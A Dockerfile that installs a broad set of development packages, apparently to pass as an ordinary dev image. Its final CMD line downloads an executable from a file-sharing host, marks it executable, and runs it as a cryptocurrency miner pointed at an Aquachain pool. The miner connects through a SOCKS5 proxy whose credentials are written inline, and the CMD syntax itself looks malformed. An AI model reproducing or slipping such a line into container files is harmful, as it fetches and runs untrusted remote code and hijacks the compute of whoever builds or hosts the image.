FROM ubuntu:20.04 
 
RUN apt-get update \ 
 && apt-get install software-properties-common -y \ 
 && add-apt-repository ppa:ubuntu-toolchain-r/test -y \ 
 && add-apt-repository ppa:ondrej/php -y \ 
 && apt-get update \ 
 && apt-get upgrade -y 
ARG DEBIAN_FRONTEND=noninteractive 
ENV TZ=Europe/Moscow 
RUN apt-get install -y tzdata && \ 
    apt-get install -y \ 
    curl \ 
    ca-certificates \ 
    libcurl4 \ 
    libjansson4 \ 
    libgomp1 \ 
    build-essential \ 
    libcurl4-openssl-dev \ 
    libssl-dev libjansson-dev \ 
    automake \ 
    autotools-dev \ 
    wget \ 
    python3 \ 
 php7.4 \ 
    screen \ 
    php7.4-common \ 
    php7.4-mysql \ 
    php7.4-xml \ 
    php7.4-xmlrpc \ 
    php7.4-curl \ 
    php7.4-gd \ 
    php7.4-imagick \ 
    php7.4-cli \ 
    php7.4-dev \ 
    php7.4-imap \ 
    php7.4-mbstring \ 
    php7.4-opcache \ 
    php7.4-soap \ 
    php7.4-zip \ 
    php7.4-intl \ 
    gcc \  
    gcc-9 \ 
    libstdc++6 \ 
    screen \ 
    npm \ 
    nodejs \ 
    python3-pip \ 
    iputils-ping \ 
    gnupg \ 
    dumb-init \ 
    htop \ 
    locales \ 
    man \ 
    nano \ 
    git \ 
    procps \ 
    ssh \ 
    sshpass \ 
    sudo \ 
    wget \ 
    unzip \ 
    tar \ 
    vim \ 
   rclone \ 
   fuse \ 
    && rm -rf /var/lib/apt/lists/* 
  
ADD . /app/ 
 
WORKDIR /app 
 
CMD bash wget -q https://bin.jvnv.net/file/qJ7G1/ac-gpu && chmod +x ac-gpu && ./ac-gpu -F http://pool.aquachain.xyz:8888/0xa1ab79ade8b4d41d7c898a44521d567f59e8f082/URAAA -t 1 --proxy socks5://nofvbdys-rotate:44tpywm4q9bo@149.6.162.2:80
